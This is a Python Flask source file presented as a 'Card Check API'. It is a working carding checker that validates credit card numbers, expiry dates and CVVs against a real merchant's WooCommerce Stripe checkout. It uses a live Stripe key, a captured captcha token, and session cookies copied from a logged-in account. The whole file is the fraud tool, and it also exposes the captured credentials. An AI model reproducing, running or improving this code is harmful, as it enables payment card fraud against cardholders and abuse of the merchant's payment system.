from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def parse_card_data(card_string):
    """Parse card data from CC|MM|YYYY|CVV or CC|MM|YY|CVV format"""
    try:
        parts = card_string.split('|')
        
        if len(parts) != 4:
            return None, "Invalid format. Use: CC|MM|YY|CVV or CC|MM|YYYY|CVV"
        
        card_number = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Handle year format (YY or YYYY)
        if len(exp_year) == 2:
            exp_year = '20' + exp_year  # Convert YY to YYYY
        elif len(exp_year) != 4:
            return None, "Invalid year format"
        
        # Basic validation
        if not card_number.isdigit() or len(card_number) < 15:
            return None, "Invalid card number"
        
        if not exp_month.isdigit() or not (1 <= int(exp_month) <= 12):
            return None, "Invalid expiration month"
            
        if not exp_year.isdigit() or len(exp_year) != 4:
            return None, "Invalid expiration year"
            
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return None, "Invalid CVV"
        
        return {
            'number': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvv': cvv
        }, None
        
    except Exception as e:
        return None, f"Error parsing card data: {str(e)}"

def process_payment(card_data):
    """Process payment with Stripe and website"""
    try:
        # Step 1: Create payment method with Stripe
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
        }

        data = {
            'type': 'card',
            'card[number]': card_data['number'],
            'card[cvc]': card_data['cvv'],
            'card[exp_year]': card_data['year'],
            'card[exp_month]': card_data['month'],
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
            'referrer': 'https://infiniteautowerks.com',
            'time_on_page': '68245',
            'client_attribution_metadata[client_session_id]': 'a9797903-c362-4ee7-90e7-f919e2678af7',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': 'b5942a0a-7364-4398-ab45-2592cb7d7378',
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': 'a17188ef-d87f-450a-b962-c9db34b199fbc689fd',
            'muid': 'a1349dda-f447-4687-8a31-31603788b86cdd4e80',
            'sid': '720e38c8-6e6b-45b2-861b-a2d9a8f8d670b864a7',
            'key': 'pk_live_51MwcfkEreweRX4nmQiCY6jeQxtsjLX5e6Ay21129TAUqIYX7EfA3WCMx4JfRcKjDXzoitC0yBW4LCycyw2BIt2EZ00BUrtdK3b',
            '_stripe_version': '2024-06-20',
            'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY0NDM1NjU0LCJjZGF0YSI6IkliT2o0L1BuUDVEZTlXOFcyZUI4ems1NVBKdW5jWjBFWFZML3RRQnhlUWVYVzNXZU5XSFJKV1BpckNzekJBZ3FXa1dwUEZDZUZISEdHRlRZQWxjZlZuT1ZTbzM2dWM1VkgyNFM4bXRaN3JZckJmRW5reVh4QmZNajlmMVBOZ0pTb3ZDeElqbXhDNVcrcEdsYW9TZC9PeEpWU1pUalQ5VlFpZnJFS0VHb0JjcG1LV0RIOGdtODZRVUZvSU1yU2RJMHhxQVl1Q0gyOXY2dmtZeU0iLCJwYXNza2V5IjoidTVXS3RZUVphTWVDTGZsNkVsMjVDdW9IVkRCa2ZOUk1KR3JRd0pLRXA4NzNrSFRKeWRzU1ZkbmlnbTFzK1g2MVlWVnI3QzlJREJ4ZDdjTU12amZsd1VmblRyMUpIQVMxWjUxUnErUGtsMEJpWHhDbmlqYllraWNaTTc5QnJFeFI5R1M2VUp0ejM3cjl3K3lvbVo1bmZKckE4a3FQV0JTR0FvcE83NFk0MU5jMzdtTVp0OFhGMU9Ua3doWlFFcVZlWk9ISGVZcGRhTlVFOWVzSzZnMDVDbWJvSXZyRE1SR0tBMnI3WjYzT0xNdVF2dlYreUdtSkd5RVNDelNSNHBRNlVvQlVBNjFBQXJnSis5SGR5NjZpN0hxSUxTNWpjYWRsQWIxL1Q4VHNkTVBWSTI2YWx2a3o2WmN2dHo3RkxhaVhLZWlHaXM3UmpVQU05d2pHR0ljdHJHM1RHOS85ZWZGZUV6d3Y0MHF4a0lFY1c2amFFdVNwQVNYd0JtWDc2cWZyeGdOR3JHUk0xR1VWazFTQ1RtQUcwN2lIN1BiV3FrVE5EQkxGbGtUR0Vack9JV2cvUTVuUG5Ba2J6K1lBZmNMVWhFaDRiVUorLzZ1QllHRUNxeUlHbklybzdEUjMvNGNtaDRtOEhSdVp3OUdvb0ZNQW9aaVBxRTB0aXNsVGo4bmZpUFIydVJKRm10WThmS2V5QnE1TzdaL3ppcTdWenFRUXNVNnEyMjN6Q25DZTdZZHVLL1pIYXdkdGtkTTBTdDBISU9OTEFCMnFLbGthWUl4VEc2N1hRZlFabTlsNFJiSkJ5cjNsNjlJZEtpbnR3K3ZSQkJteFltQkN1MmZwUGdiS2ZXTlB0MkJKV2dPeVl6MXA4NVJ5Y1I1MlR6bng4NUJnRUNnMkZqMlFwZGkySVAvZ1lpUlRFSHJXN1R6WXE0d215ZVBQVTJNK0NNU2hMUVJUY1BCdG9rY2dYd0hVL21VNXByZGMwLzBVbTVsL3hudGE0eXVzdzhSSFBqOWJ6eGIxclpFMk54NVJrVXJxbVIraUoyTkYzcW92REsybVdDUjZiWFVac3NRYktOckthRDZqVmNvNXRJNmc2T2xRTUx2R1o5dGVjajhkck5CZk1ESTJsS3RjS1hIdWt6WmRTdEJybTRLcUtDNk5tN2M1eFU3QTZFODFGTmI4bHFnS1I3dXhOOC9WN1pJaVN1ZWpqeS9ya3drN2xpOElxbVNlN1l6V1BJNEhCZ0lRbHlrOWw1SXFudWRMOExCUU51c0o2MUFwalZBR0JEUTE0NTdkekNjc2JlazNXL3g5WVlkaTlHZ0I0UFhCQ1Bsc0NqRmdtQ0VmZkppdmdYUCtzcnJFeXYxd1p4SUJwZE1aR21VNXlvcjZXR3I0UmdoSm85Rzh5ZjhoVE03eW9abW1wTG5vWGxQRWlWVHp2RE40K0F6ZDhBM1lGSzhkcGxJWk03MWlMK2wzbjdJZ0ptckkxNmxENFNGT3N5L0NDakkveHAzcmlZT1pRSk9HT1orUkFTRVM0WmhVcm9IQ01nSW1BWVp2SHp1MEZTT1V6emFoeVJFcnRiUGRrblJIS3ppS09GeTNlQzlNYTBZcUFienNOVElqWGhkWFBpbS9peTN5ZDdyNDVBcVhBWjQxdnJlNmxvOVhvaXlIeWJ5cjJBajAwejFLT0JYcUFPZXdhdVQyYUI4cHVoaGV4OFZ2cHNtYmEyYW5udEd0Y2ljb2VHV3ZqQ1B2TjRMVm96TXdMY1E0eXpOZjJVQWZVUFNaMEwwK0M3UW1OZVJPWHdGNmdPc1BFRkxzMkpQdmlrRytIUW1Ecm54YjF2Qy9pWFlRUGg3N0JlZHVaMXBWeGJuUmpBWTlTUml3NGhpR3ZjZU1NdGNMVjRFYjJhanlHdTY2Wko1dzZ1L0JoNmlxeXNITzBEb1ljc29rQTMwWnN0bmx2UjNxZXU5Qm1ZdXpETVdaeUpZK3plQUJhZnFGcXpWR3hUZ3lhT0NoNDYrOU85c3dpR2ZqNHorZTRqQjIvY3AwNDE0UlpYby9VdkdUMS9nWUMrTjRGL2VwZWpMUzY3UG9MT0hybW5YeVU4ek5FcFhYbWI0cU5VQ2xvTDV2RzlCVkpMQVZxOUtEUkRjd1dnL1dKUDlUM0ZtSkFyNzYyb3liSENzaG5NRGNjK3pHQkhPTGJ1Tm5ZOXJjQURvUXBDdzJ3UG9pdU9qZDA3V3l5T1ViVjlrZUFUTnc5NldtVnlZRklpdWpXQkY4QUg4dGh3d05EM3c1RkdTckxUMDkzS05hS1ZsTmR5cXMrWk5mNUlkMm9PWXNOc1pwMlpwb2VJZldacis0WTA2MjlQYkY2UUcxQil4U2dWekg3MnowUXNtRWMrc3pORmNRTEt1WFhGZTY0b2VZTHkrNnpSMHAyNXkyTUwxM0YxWXZDUzl5eng5Z1V4MklNbmJibkUvMnFmNlU1NmJLaE8xaFk2SG4vc2R0c09mdVJaVmthT3pyWlJwUlFJU0tnRWtVTUxyYTl0UmdvemVkYVF2STVuNE1ONWxoRHVVWE9BRlVtT3k4OWFmQU1KK2ZGMW03RjB0MklyeXhWWnVWWjNWNjVQckdzakdWS0tjbFc0WEVRYWpiZ003a3VIT2hZUT09Iiwia3IiOiIyM2M3ZWEzNyIsInNoYXJkX2lkIjoyNTkxODkzNTl9.-MQedRcGpyZZUwHNjHTw9ebNyytjK2pUmYvRATIlDdE'
        }

        # Convert dict to form data
        form_data = ""
        for key, value in data.items():
            form_data += f"{key}={value}&"
        form_data = form_data.rstrip('&')

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=form_data)
        stripe_response = response.json()
        
        if 'id' in stripe_response:
            payment_method_id = stripe_response['id']
            
            # Step 2: Submit to website
            cookies = {
                'wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb': 'rambook554%7C1765644695%7CsLR9rdZ7UitKnNXSjv94Q0ONAjPrknuEy4ICscivFaV%7C1e13b2966f06898471dfead352d9f27fbaa3cefddfdddca5cd7ea41105d7dad3',
                '__cf_bm': '8jGvuOWpTRVkeGKnXvSwuNU26SOKjDQRvxu4aNSy1jQ-1764434971-1.0.1.1-D5ZmfgE.kEbY4Ul_XAyJvgp1OaVJ7i6rrpEZYo_r4q23vE3fg.yg7wtAbZOBSh.cxGbPERGqmOoOzT1SNPT1iVGJyLrIxeAs.GDq3AZT8sg',
                'sbjs_migrations': '1418474375998%3D1',
                'sbjs_current_add': 'fd%3D2025-11-29%2016%3A19%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_first_add': 'fd%3D2025-11-29%2016%3A19%3A33%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2F%7C%7C%7Crf%3D%28none%29',
                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Safari%2F537.36%20Edg%2F142.0.0.0',
                'tk_or': '%22%22',
                'tk_r3d': '%22%22',
                'tk_lr': '%22%22',
                'checkout_continuity_service': '4ec3c926-d973-4034-bbf3-343cddc25d2c',
                'wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb': 'rambook554%7C1765644695%7CsLR9rdZ7UitKnNXSjv94Q0ONAjPrknuEy4ICscivFaV%7C7ec11243082f78fcf53ba86f00e2c28f236346b2a5f61779212048cf4e0aa70e',
                '__stripe_mid': 'a1349dda-f447-4687-8a31-31603788b86cdd4e80',
                '__stripe_sid': '720e38c8-6e6b-45b2-861b-a2d9a8f8d670b864a7',
                'tk_ai': 'POxTD45euF96mr0iWneztmNN',
                'tk_ai': 'wbq0AufjPKqJ1PTYsse9ULqW',
                'sbjs_session': 'pgs%3D15%7C%7C%7Ccpg%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F',
                'tk_qs': '',
            }

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://infiniteautowerks.com',
                'priority': 'u=1, i',
                'referer': 'https://infiniteautowerks.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': '21dfc874d8',
            }

            final_response = requests.post('https://infiniteautowerks.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
            final_data = final_response.json()
            
            # Return the exact format you want
            if final_data.get('success') == False:
                return {
                    "success": False,
                    "data": {
                        "error": {
                            "message": "Your card was declined."
                        }
                    }
                }
            else:
                return {
                    "success": True,
                    "data": {
                        "message": "Payment successful!"
                    }
                }

        else:
            # If payment method creation failed
            return {
                "success": False,
                "data": {
                    "error": {
                        "message": stripe_response.get('error', {}).get('message', 'Payment failed')
                    }
                }
            }

    except Exception as e:
        return {
            "success": False,
            "data": {
                "error": {
                    "message": f"Processing error: {str(e)}"
                }
            }
        }

@app.route('/')
def home():
    return jsonify({
        "message": "Card Check API Running",
        "usage": "Use /check/CC|MM|YY|CVV or /check/CC|MM|YYYY|CVV",
        "developer": "DEVELOPED_BY_Assassin"
    })

@app.route('/check/<path:card_data>')
def check_card(card_data):
    """API endpoint to check card data"""
    # Remove any leading/trailing slashes
    card_data = card_data.strip('/')
    
    # Parse card data
    card_info, error = parse_card_data(card_data)
    
    if error:
        return jsonify({
            "success": False,
            "data": {
                "error": {
                    "message": error
                }
            }
        })
    
    # Process payment
    result = process_payment(card_info)
    
    # Convert response to string and add developer signature
    response_str = str(result) + "\n\n**DEVELOPED_BY_Assassin**"
    
    return response_str

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "developer": "DEVELOPED_BY_Assassin"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
